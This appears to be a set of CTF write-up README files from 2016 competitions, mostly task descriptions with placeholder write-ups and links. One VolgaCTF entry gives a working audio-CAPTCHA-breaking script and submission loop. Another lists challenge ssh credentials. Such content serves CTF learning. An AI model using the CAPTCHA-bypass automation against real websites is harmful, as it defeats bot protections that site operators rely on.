## Other write-ups and resources

* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/web/LuckyCharms
* http://sibears.ru/labs/tuctf-2016-lucky-charms/
* https://uss.informatik.uni-ulm.de/?p=429
# TU CTF : petpaddinginc-150

**Category:** Web
**Points:** 150
**Solves:** 
**Description:**
We believe a rouge whale stole some data from us and hid it on this website.

Can you tell us what it stole?

http://104.196.60.112/



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/TUCTF/web/PetPaddingInc
# TU CTF : student-grades-50

**Category:** Web
**Points:** 50
**Solves:** 
**Description:**
We are trying to find out what our grade was, but we don't seem to be in the database...

Can you help us out?

http://104.199.151.39/index.html


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/bl4de/ctf/tree/master/2016/TUCTF_2016/Student_Grades_Web50
* http://www.codehead.co.uk/tuctf2016-student-grades/
* https://uss.informatik.uni-ulm.de/?p=429
# UFO CTF School 2016 : rotate-it-25

**Category:** Crypto
**Points:** 25
**Solves:** 
**Description:**
Translated from russian:
The task:
We intercepted the message but it was encrypted . We were not able to decrypt it . Can you ?
Links to job:
    https://goo.gl/dD2xiG
    https://yadi.sk/d/sbGT-cqsqKTKB


## Write-up

(TODO)

## Other write-ups and resources

* https://m.vk.com/wall-118537777_1 (russian)
# UFO CTF School 2016 : find-me-100

**Category:** Forensic
**Points:** 100
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/MrMugiwara/WriteupsCTF/tree/master/ufoCTF2016/Find_Me
# UFO CTF School 2016 write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](TODOLOCAL)

## Repo-local write-ups

* none yet

## External write-ups only

* [reverse/easy-revertse-100](reverse/easy-revertse-100)
* [reverse/great-random-150](reverse/great-random-150)
* [reverse/check-pass-100](reverse/check-pass-100)
* [reverse/burn-in-hell-creator-400](reverse/burn-in-hell-creator-400)
* [forensic/find-me-100](forensic/find-me-100)
* [crypto/rotate-it-25](crypto/rotate-it-25)
* [web/stupid-admin-75](web/stupid-admin-75)

## Missing write-ups
# UFO CTF School 2016 : burn-in-hell-creator-400

**Category:** Reverse
**Points:** 400
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/thekidcrash/ctf-writeups/tree/master/2016/UFO%20School%20CTF
# UFO CTF School 2016 : check-pass-100

**Category:** Reverse
**Points:** 100
**Solves:** 
**Description:**
Now, not so easy to get, IDA will help you!


## Write-up

(TODO)

## Other write-ups and resources

* https://youtu.be/9y9ZavLAY9E
# UFO CTF School 2016 : easy-revertse-100

**Category:** Reverse
**Points:** 100
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://www.youtube.com/watch?v=ouM-jooNx6g
* https://www.youtube.com/watch?v=ul8mMWx3l_Q
# UFO CTF School 2016 : great-random-150

**Category:** Reverse
**Points:** 150
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://www.youtube.com/watch?v=jLuqhVgWtRA
# UFO CTF School 2016 : stupid-admin-75

**Category:** Web
**Points:** 75
**Solves:** 
**Description:**
Translated from russian:

We did not know that our administrators are so stupid . Please sign in their accounts and get the flag.
Addresses of service:
    http://188.226.160.200:7012/
    http://37.139.25.168:7012/

## Write-up

(TODO)

## Other write-ups and resources

* https://m.vk.com/wall-118537777_2 (russian)
#Volga CTF Quals 2016 eva writeup

###*Category:* Admin *Points:* 300

> There is a dump of the storage array of one of the earliest kernels of GAI.
The image matters.

[dump (600MB)](https://yadi.sk/d/YK64BLZjqVEjo)
[key.jpg](admin/eva-300/key.jpg)

## write-up

(TODO)

## Other write-ups and resources

* <https://ctf.rip/volgactf-2016-eva-admin/>
#Volga CTF Quals 2016 image_archeology writeup

###*Category:* Admin *Points:* 350

> We have found the file, which contains a part of gai. But where is it?
> Hints:
> * You don't need any special reverse skills to solve this. It will be enough to use strings to reveal how the flag can be found.

[image-archeology](admin/image_archeology-350/image-archeology)

## write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-26-volga2016-quals/image_archeology>
* <http://www.hamidx9.ir/blog/2016/59/29/volgactf-4-writeups-3pwn-1admin.html>
#Volga CTF Quals 2016 shiver_pc writeup

###*Category:* Admin *Points:* 100

> An old PC was found in the old office of GAI's developers. There is definitely valuable information inside. But it is a problem with getting access to it…

[HDD Image (3.3GB)](https://yadi.sk/d/0dfYhc9tqUtZo)
[mirror1](https://yadi.sk/d/73qQYQYEqUuLT)
[mirror2](https://yadi.sk/d/yMSEPFD7qUvFX)
[mirror3](https://drive.google.com/file/d/0Bx88E0CkOozMVkZEb09SSEwzRjQ/view?usp=sharing)

## write-up

(TODO)

## Other write-ups and resources

(TODO)
#Volga CTF Quals 2016 ask_the_oracle writeup

###*Category:* PPC, Web, Crypto *Points:* 400

> Ahah, BAI has revealed itself! But now it uses a new cryptographic service to store its secrets!
> 
> You should have a go at cracking it in order to obtain another part of information about BAI.

oracle.2016.volgactf.ru:7373

## write-up

(TODO)

## Other write-ups and resources

(TODO)
#Volga CTF Quals 2016 five_blocks writeup

###*Category:* Crypto *Points:* 600

> The creators of the AI we're so desperately looking for used the remote server to encrypt their data. It seems that this service merely encrypts the data we're sending to it. We managed to find a possibly valuable piece of encrypted data along with the server's script. Could you take a look and see if anything can be done?
>
> nc five-blocks.2016.volgactf.ru 8888
>
> Hints
>
> What would you get if you'd encrypted four-block data of the form AABC, where A, B, C are 64-bit arbitrary blocks?
> 
> Are the rounds of the second block cipher completely dependent or independent of each other? Or is the truth somewhere in the middle?

[server.py](crypto/five_blocks-600/server.py)
[ciphers.py](crypto/five_blocks-600/ciphers.py)
[flag.enc](crypto/five_blocks-600/flag.enc)

## write-up

(TODO)

## Other write-ups and resources

[H4x0rPsch0rr](http://hxp.io/blog/27)
#Volga CTF Quals 2016 lazy writeup

###*Category:* Stego *Points:* 250

> There's some valuable data on the server. However, to retrieve it we can only execute "signed" commands. We have the server script and some other files. Dare to take a look at it?
> 
> nc lazy.2016.volgactf.ru 8889
>
> Hints
> * nc might be a little misleading, but then again you've got the script to see what's really being sent back and forth.

[server.py](crypto/lazy-250/server.py)
[key.public](crypto/lazy-250/key.public)
[exit.sig](crypto/lazy-250/exit.sig)
[leave.sig](crypto/lazy-250/leave.sig)

## write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/VOLGACTF/crypto/lazy>
* <https://cryptsec.wordpress.com/2016/03/27/volga-ctf-quals-2016-write-up-lazy-crypto-250/>
#Volga CTF Quals 2016 quiz writeup

###*Category:* Crypto *Points:* 10

> Third bomb that took the shine out of nazis

## write-up

(TODO)

## Other write-ups and resources

(TODO)
#Volga CTF Quals 2016 xxy writeup

###*Category:* Crypto *Points:* 300

> I remember some of the AI engineers saying this was a very unusual cryptosystem. It was used to encrypt and transmit information of the enormous importance. Moreover, it seems there's no need to share a key before the transmission.
> 
> We've found some kind of a key file, a ciphertext and the enciphering script itself. Is it possible to decrypt the data?

[key file](crypto/xxy-300/keypublic)
[ciphertext](crypto/xxy-300/ciphertext)
[script](crypto/xxy-300/cryptpy)

## write-up

(TODO)

## Other write-ups and resources

[H4x0rPsch0rr](http://hxp.io/blog/26)
#Volga CTF Quals 2016 amazing writeup

###*Category:* PPC *Points:* 250

> An important step towards the strong AI is the ability of an artificial agent to solve a well-defined problem. A project by the name 'amazing' was one of such test problems. It's still up...
>
> nc amazing.2016.volgactf.ru 45678

## write-up

This was an exceptionally fun problem. I'd like to give you an overview
of my code so it's understandable :)

I used a recursive algorithm to solve this. The algorithm is called every time
you have more than one move to make. You aren't allowed to go backwards, so it
is only called when you have two *new* directions to go. The newly forked
algorithms will return False if they hit a dead end or if all of the sub
branches return false. If it hits "#" then it returns the value to make that
move so the algorithm can "see" what's next. Finally, the winning condition is
that you are in the bottom right of the map, so it test to see if you are
there.

I tried to document my code well enough, feel free to contact me (@bert88sta).

[maze.py](./maze.py)
## Other write-ups and resources

* <https://github.com/EspacioTeam/write-ups/tree/master/2016/volga/Amazing>
#Volga CTF Quals 2016 secure_image writeup

###*Category:* PPC *Points:* 250

> Here is a strange obfuscated client, try to find how deep the rabbit hole goes.

[files - files.zip](ppc/secure_image-250/files.zip)

## write-up

(TODO)

## Other write-ups and resources

(TODO)
#Volga CTF Quals 2016 tic-tac-toe writeup

###*Category:* PPC *Points:* 200

> An important step towards the strong AI is the ability of an artificial agent to solve a well-defined problem. A project by the name 'tic-tac-toe' was one of such test problems. It's still up...
>
> nc tic-tac-toe.2016.volgactf.ru 45679

## write-up

For this problem, I did a bit of playing against their AI normally It seemed as
though their AU cares more about making a specific setup to win than actually
stopping us. (I've seen it not stop me from getting three in a row on it's turn )

Knowing this, my script was very simple. There are two methods that are
essentially the same, one assesses for when you start, one for when the
opponent starts. It will: (in order of priority) make the winning move if there
is one, stop the opponent's winning move, or make a random move. This seemingly
unstrategic method will give you a score approximately 3 times that of their
AI. 

This code was written at 3 or 4 AM, so if anything needs clarified please
contact me (@bert88sta).

[tic-tac-toe.py](./tic-tac-toe.py)

## Other write-ups and resources

* <http://www.codehead.co.uk/volgactf2016-tic-tac-toe/>
#Volga CTF Quals 2016 yacst2 writeup

###*Category:* PPC *Points:* 350

> Captcha is a modern simple Turing test for everyday use, for human it's simple, but for bot or a simple neural network captcha can become a hard nut to crack.
>
> You can try to solve it with your AI too, but it definitely can be solved with several lines of code, isn’t it?
>
> Hints
> * gist
> * gist2 Adding a Noise

http://yacst2.2016.volgactf.ru:8090/

[gist](https://gist.github.com/volalex/799789663f8c29f1bb58)
[gist2](https://gist.github.com/volalex/4c62beaa721807dbc139)

## write-up

There are few opportunities to do it:

  * Use google servers for recognition (slow; boring; not free)
  * Use some audio recognition package. I've tried two of them: could not understand how to use them
  * My choice: imagemagick.

Yes, imagemagick.

Let's look at captcha [spectrogram](https://en.wikipedia.org/wiki/Spectrogram):

```
sox new.wav -n spectrogram -Y 130 -l -r -o new.wav.png 
```

![Histogram](new.wav.png)

Because the voice is artificial, all the sounds really look the same.
This way, we can work with spectrogram like with usual captcha.

At the bottom of the image you can see some low-frequency noise. We have to cut it and with imagemagick it's really easy. Moreover, sound vary in length.
Now you can use your favourite captcha solver or continue reading.

First of all, we have to cut the spectrogram and binarize it. 

```
convert new.wav.png -colorspace gray  -colors 2  -normalize -crop 100000x80+0+0 gray.new.wav.png
```
![Binarized histogram](gray.new.wav.png)

Next step is separating every sound. I've used my old script (you can find it as split.py in `files.tar.gz`) for it. It simply iterates over every image column and return regions which contains at least one black pixel.

There was a problem with it: sound "nine" on spectrogram was sometimes separated incorrectly (two images instead of one). I could fix that easily even without editing python script, but the result was 80% successful, so I did not bother.

```
python3 split.py gray.$1.png | (let imgn=0; while read eh begin end; do

  echo "found region $begin $end"
   convert gray.new.wav.png -crop $(($end-$begin))x80+$begin+0 -resize 50x80\! out.gray.new.wav.$imgn.png;

  let imgn++
done; )
```

As you can se, I've forced cropping every symbol to a 50x80 (by `-resize 50x80\!`). It makes symbols with different lengths look the same.

Then, I listened to few captchas and made a symbol table (from zero to nine):

![S0](S0.png) ![S1](S1.png)
![S2](S2.png) ![S3](S3.png)
![S4](S4.png) ![S5](S5.png)
![S6](S6.png) ![S7](S7.png)
![S8](S8.png) ![S9](S9.png)

The easiest part! We have to compare the splitted image to all the templates. Images are compared by calculating a difference image: 

  * Create the difference image
  * Count the number of white pixels on it
  * The image with the less white pixels is the the template of our symbol

An example of difference:

![Difference](difference.png)

```
for s in $(seq 0 9); do
  # make the difference
  composite new.wav.symbol0.png template_$s.png -compose difference difference.png
  # count white pixels
  whites=$(convert test.png -define histogram:unique-colors=true -format %c histogram:info:- | grep '255,255,255' | awk -F: '{print $1}')
  # echo it
  echo 0$(echo -ne $whites | tr -d ' \t') $s
done | sort -n | head -n1 | cut -d' ' -f2 # select an entry with the less white pixels
```

That's it! Captcha is broken. There is an exploit code:

It took about 3 hours to break through 3000 cycles. Every captcha was downloaded in about 2 seconds and recognitized in about a half on my laptop.

    CURL() { curl -L -H 'Cookie: JSESSIONID=05e2AjABG9POA_Hgl6lwP1lzeyD3lIVFQKi5cNeU' $@; } 
    while :; do
      # recieve new captcha
      CURL http://yacst2.2016.volgactf.ru:8090/captcha > new.wav
      # parse it
      REPLY=$(bash do.sh new.wav | grep -v region | tr -d '\n')
      echo $REPLY
      # send reply
      CURL --data "captcha=$REPLY"
    done

## Other write-ups and resources

* <https://github.com/EspacioTeam/write-ups/tree/master/2016/volga/YACST2>
* <http://corb3nik.github.io/2016/03/25/YACST2/>
* <https://github.com/p4-team/ctf/tree/master/2016-03-26-volga2016-quals/yacs2>
* <https://der.ttyh.ru/blag/post/yacst-writeup/>
#Volga CTF Quals 2016 web_of_science writeup

###*Category:* Pwn *Points:* 250

> By the name of this service, it is the early version of the well-known scientific search engine. Curiously, it's still working.
> 
> nc webofscience.2016.volgactf.ru 45678

[binary - web_of_science](ppc/web_of_science-250/web_of_science)

## write-up

(TODO)

## Other write-ups and resources

* <https://blahcat.github.io/2016/03/28/volgactf-2016-web-of-science.html>
* <https://0xabe.io/ctf/exploit/2016/03/29/VolgaCTF-pwn-Web-of-Science.html>
* <http://www.hamidx9.ir/blog/2016/59/29/volgactf-4-writeups-3pwn-1admin.html>
#Volga CTF Quals 2016 web_of_science_2 writeup

###*Category:* Pwn *Points:* 350

> This is an improved version of the early version of the well-known scientific search engine. Curiously, it's still working.
> 
> nc webofscience2.2016.volgactf.ru 45679

[binary - web_of_science2](pwn/web_of_science_2-350/web_of_science2)

## write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/LiveOverflow/937b659c9a37be099ddd>
* <https://0xabe.io/ctf/exploit/2016/03/29/VolgaCTF-pwn-Web-of-Science2.html>
* <http://www.hamidx9.ir/blog/2016/59/29/volgactf-4-writeups-3pwn-1admin.html>
* <https://gist.github.com/ahasselbring/5e1cd52ec3d261bd0d55>
#Volga CTF Quals 2016 web_of_science_3 writeup

###*Category:* Pwn *Points:* 400

> This is an improved version of the improved version of the well-known scientific search engine. Curiously it's still working.
>
> nc webofscience3.2016.volgactf.ru 45680

[web_of_science_3](pwn/web_of_science_3-400/web_of_science_3)

## write-up

(TODO)

## Other write-ups and resources

* <https://0xabe.io/ctf/exploit/2016/03/29/VolgaCTF-pwn-Web-of-Science3.html>
* <http://www.hamidx9.ir/blog/2016/59/29/volgactf-4-writeups-3pwn-1admin.html>
# Volga CTF Quals 2016 write-ups

The contest starts on March 25 at 19:00 SAMT/15:00 UTC and lasts for 48 hours. During the competition we will add new tasks. Flag format is always `VolgaCTF{[\x20-\x7F]+}` if not stated otherwise. 

## Repo-local write-ups

* [ppc/amazing-250](ppc/amazing-250)
* [ppc/tic-tac-toe-200](ppc/tic-tac-toe-200)

## External write-ups only

* [admin/image_archeology-350](admin/image_archeology-350)
* [pwn/web_of_science-250](pwn/web_of_science-250)
* [pwn/web_of_science_2-350](pwn/web_of_science_2-350)
* [pwn/web_of_science_3-400](pwn/web_of_science_3-400)
* [reverse/multiple_shift-500](reverse/multiple_shift-500)
* [crypto/lazy-250](crypto/lazy-250)
* [ppc/yacst2-350](ppc/yacst2-350)
* [web/optional_cats-150](web/optional_cats-150)
* [crypto/xxy-300](crypto/xxy-300)
* [crypto/five_blocks-600](crypto/five_blocks-600)
* [reverse/broken-200](reverse/broken-200)
* [reverse/transformer-400](reverse/transformer-400)

## Missing write-ups

* [ppc/secure_image-250](ppc/secure_image-250)
* [web/just_listen-200](web/just_listen-200)
* [crypto/quiz-10](crypto/quiz-10)
* [stego/remastered-100](stego/remastered-100)
* [web/undesired_resource-350](web/undesired_resource-350)
* [crypto/ask_the_oracle-400](crypto/ask_the_oracle-400)
* [admin/shiver_pc-100](admin/shiver_pc-100)
* [reverse/multiple_shift-500](reverse/multiple_shift-500)

#Volga CTF Quals 2016 broken writeup

###*Category:* Reverse *Points:* 200

> This might be a part of GAI, but it must have been broken... Could you fix it?

[broken](broken?raw=true)

## write-up

(TODO)

## Other write-ups and resources

[insane::Coder alessandro;](https://alessandrogar.io/ctf/volgactf-2016-quals-broken-writeup)
#Volga CTF Quals 2016 multiple_shift writeup

###*Category:* Reverse, Crypto *Points:* 500

> This binary was used to encrypt something valuable. We don't have the key, of course, but the encrypted data is there, as well as something else...

[bundle.zip](reverse/multiple_shift-500/bundle.zip)

## write-up

(TODO)

## Other write-ups and resources

(TODO)
#Volga CTF Quals 2016 transformer writeup

###*Category:* Reverse *Points:* 400

> This binary does something with the data. The transformation must be reversible, but the details are unknown. It shouldn't be too difficult to reverse that transformation and obtain the flag, should it?

[transformer](transformer?raw=true)
[flag.transformed](flag.transformed?raw=true)

## write-up

(TODO)

## Other write-ups and resources

[insane::Coder alessandro;](https://alessandrogar.io/ctf/volgactf-2016-quals-transformer-writeup)  
Reversing and writing a decoder for the Transformer challenge from the VolgaCTF 2016 Quals.
#Volga CTF Quals 2016 remastered writeup

###*Category:* Stego *Points:* 100

> It speaks! Not quite sure what it's saying though...

[sound](stego/remastered-100/stego.wav)

## write-up

(TODO)

## Other write-ups and resources

(TODO)
i#Volga CTF Quals 2016 just_listen writeup

###*Category:* Web *Points:* 200

> Our spy-agent bot has penetrated into a sophisticated system, which GAI uses to communicate with its followers. The spy-agent has managed to find some critical data for us, but it can't share it publicly, as it's being undercover.
> 
> You need to obtain those pieces of information.
> 
> Hints:
> * Think where could you store all connections in a multi-user application.

[http://jl.2016.volgactf.ru:7777](http://jl.2016.volgactf.ru:7777)

## write-up

(TODO)

## Other write-ups and resources

(TODO)
#Volga CTF Quals 2016 optional_cats writeup

###*Category:* Web *Points:* 150

> Our agent has found out that GAI loves animals. It has created a banner network to support animal welfare organizations.
Reveal its secrets!

http://optcat.2016.volgactf.ru:8080/

## write-up

(TODO)

## Other write-ups and resources

* <http://blog.huntergregal.com/2016/03/volgactf-2016-optional-cats-writeup.html>
#Volga CTF Quals 2016 undesired_resource writeup

###*Category:* Web, PPC *Points:* 350

> BAI is a very smart program - it has created a social network for bots in order to control their interests. However, BAI is a bot itself, so he also has some interest in that network too. In fact, it stores some secrets in it. The problem is nobody knows BAI's nickname, so it may be anyone.
>
> Find BAI and steal its secrets!
>
> ur.2016.volgactf.ru:8080

## write-up

(TODO)

## Other write-ups and resources

(TODO)
# WhiteHat Contest 11 : arapoem-200

**Category:** Crypto
**Points:** 200
**Solves:** 0
**Description:**

nc 118.70.80.143 9507

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Contest 11 : puncrypto-system-200

**Category:** Crypto
**Points:** 200
**Solves:** 5
**Description:**


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Contest 11 : extract-me-100

**Category:** Forensics
**Points:** 100
**Solves:** 15
**Description:**

flag = sha1(WhiteHat{...})

## Write-up

(TODO)

## Other write-ups and resources

* https://sugivo.wordpress.com/2016/06/25/whitehat-contest-11-for100-extract-me/
# WhiteHat Contest 11 : wyginwys-200

**Category:** Forensics
**Points:** 200
**Solves:** 19
**Description:**

nc 118.70.80.143 7337

## Write-up

(TODO)

## Other write-ups and resources

* https://sugivo.wordpress.com/2016/06/25/whitehat-contest-11-what-you-get-is-not-what-you-see/
* https://quandqn.wordpress.com/2016/06/25/whitehat-contest-11-wyginwys-forensics-200pts
* http://dakutenpura.hatenablog.com/entry/2016/06/28/015322
* http://www.codilime.com/whitehat11-wyginwys/
# WhiteHat Contest 11 : sleeping-barber-300

**Category:** Pwnable
**Points:** 300
**Solves:** 0
**Description:**

nc 118.70.80.143 23450

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Contest 11 : supermarket-200

**Category:** Pwnable
**Points:** 200
**Solves:** 2
**Description:**

nc 118.70.80.143 23449

## Write-up

(TODO)

## Other write-ups and resources

* https://amritabi0s.wordpress.com/2016/06/26/whitehat-contest-11-supermarket/
# WhiteHat Contest 11 : zozo-100

**Category:** Pwnable
**Points:** 100
**Solves:** 6
**Description:**

ssh pwnguest@118.70.80.143 1094
68bZ$wRn

## Write-up

(TODO)

## Other write-ups and resources

* http://jgeralnik.github.io/writeups/2016/06/26/zozo/
# WhiteHat Contest 11 write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](TODOLOCAL)

## Repo-local write-ups

* none yet

## External write-ups only

* [reverse/re1-100](reverse/re1-100)
* [reverse/re2-300](reverse/re2-300)
* [reverse/re3-100](reverse/re3-100)
* [forensics/wyginwys-200](forensics/wyginwys-200)
* [forensics/extract-me-100](forensics/extract-me-100)
* [pwnable/supermarket-200](pwnable/supermarket-200)
* [pwnable/zozo-100](pwnable/zozo-100)
* [web/ultimate-design-tool-100](web/ultimate-design-tool-100)

## Missing write-ups

* [crypto/puncrypto-system-200](crypto/puncrypto-system-200)
* [crypto/arapoem-200](crypto/arapoem-200)
* [pwnable/sleeping-barber-300](pwnable/sleeping-barber-300)
* [web/private-companys-keep-in-touch-tool-200](web/private-companys-keep-in-touch-tool-200)
# WhiteHat Contest 11 : re1-100

**Category:** Reverse
**Points:** 100
**Solves:** 48
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://sugivo.wordpress.com/2016/06/28/whitehat-contest-11-re-1/
* http://www.codilime.com/whitehat11-re1/
# WhiteHat Contest 11 : re2-300

**Category:** Reverse
**Points:** 300
**Solves:** 3
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://dakutenpura.hatenablog.com/entry/2016/06/28/030236
* https://github.com/sCiFis/CTF-Writeups/tree/master/WhitehatContest11-RE2
# WhiteHat Contest 11 : re3-100

**Category:** Reverse
**Points:** 100
**Solves:** 27
**Description:**

flag = SHA1(FirstRoom:SecondRoom:ThridRoom)

## Write-up

(TODO)

## Other write-ups and resources

* http://dakutenpura.hatenablog.com/entry/2016/06/28/035813
* https://github.com/ByteBandits/writeups/tree/master/whitehat-contest-11-2016/RE/RE3/sudhackar
* http://www.codilime.com/witehat11-re3
# WhiteHat Contest 11 : private-companys-keep-in-touch-tool-200

**Category:** Web
**Points:** 200
**Solves:** 0
**Description:**

http://118.70.80.143:9680/web200

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Contest 11 : ultimate-design-tool-100

**Category:** Web
**Points:** 100
**Solves:** 4
**Description:**

http://118.70.80.143:8104/

## Write-up

(TODO)

## Other write-ups and resources

* https://tsublogs.wordpress.com/2016/06/25/whitehat-contest-11-ultimate-design-tool-web100/
# Generate a CTF directory skeleton

Use `genctf.py` to generate a CTF write-up skeleton.

* Create an empty directory for the CTF, ending with the current year, e.g. `example-ctf-2015/`
* Create an empty directory in this new CTF directory for each task category, e.g. `mkdir crypto web misc trivia`
* Create an empty directory for each task in their respective category folder, e.g. `mkdir crypto/{rsalot, rsanne}`
* Download all CTF files during the CTF and save the description, points, original task name, solves and task category for each file in a file named `info`, e.g. `crypto/rsalot/info` and `crypto/rsanne/info`
* Generate a `README.md` for each `info` file in the CTF directory using the `genctf.py` tool, e.g. `python genctf.py example-ctf-2015/ info 'Example CTF'`
* Remove all the info files (make a backup of your CTF directory just in case) using `find example-ctf-2015 -name info -delete`
* Tell git to ignore all files that are bigger than 10MBytes with `cd example-ctf-2015; find . -size +10M >> .gitignore`
* Edit each `README.md` to fill in missing information (e.g. Authors, references and solves)
* Move the CTF directory to the `write-ups-$YEAR` repo, making sure that it does not already exist, and make a pull request

Use `getscores.py` to generate the scoreboard for a CTF by providing a ctftime link.

Use `checkreadme.py` to update the root README.md of a given CTF directory.
